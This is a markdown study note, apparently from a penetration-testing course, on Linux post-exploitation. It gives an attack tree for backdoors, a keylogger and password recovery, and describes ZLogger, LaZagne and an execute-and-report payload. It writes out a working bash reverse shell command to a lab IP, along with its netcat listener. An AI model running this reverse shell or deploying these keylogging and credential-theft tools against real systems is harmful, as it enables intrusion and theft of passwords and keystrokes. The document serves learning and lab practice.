# Linux malware

## Attack tree

```text
1 Backdoor
    1.1 Generate
        1.1.1 Metasploit meterpreter (OR)
        1.1.2 With TheFatRat (Trodebi) (OR)
        1.1.2 Powershell stager (usestager multi/bash) 
    1.2 Download to target machine
    1.3 Test it works
2 Keylogger
    2.1 Install and use Zlogger command
    2.2 Download to target machine
    2.3 Test it works (make executable, run in terminal, do some keystrokes, check mail)
3 Password recovery tool
    3.1 Download repo and compile latest release OR use the standalone release for Linux (version 1.0)
    3.2 Download to target machine
    3.3 Test it works (make executable, run in terminal)
```

## Notes

### Bash backdoor

Bash is a command language used in Unix & Unix-like operating systems:
* Linux
* Mac OS X
* IOS
* Android

Bash can be used to send a reverse shell to a remote computer. Simplest form:

On the target machine:
```text
$ bash -i >& /dev/tcp/192.168.122.108/8080 0>&1
```

On the kali machine:
```text
# nc -vv -l -p 8080
```

### ZLogger

Zlogger is a remote keylogger for Linux:
* Runs in the background of target system.
* Reports every key pressed on the target machine to email.
* Starts with system boot.
* Does not require root.

Remove it:

```text
$ cd .config/autostart
$ rm xinput.desktop
```
After restarting it is not running.

## LazaGne

LazaGNe is a post exploitation tool to retrieve saved passwords on local computer:
* Recovers saved passwords from lots of programs.
* Recovers passwords from memory.
* Works with Windows and Linux.
* Displays result on screen or store it on local machine.

## Execute & Report

Execute and Report is a simple payload:
* Executes a command.
* Waits for result and sends it by email.
* Execute linux commands and get info from computer.
* Download a file, execute it and report its output.
* ...

## Tools

* [Zlogger](https://github.com/z00z/ZLogger)
* [LazaGNe](https://github.com/AlessandroZ/LaZagne)
* [ZReporter](https://github.com/z00z/ZReporter)

## Resources

* [Empire wiki](https://bc-security.gitbook.io/empire-wiki/)
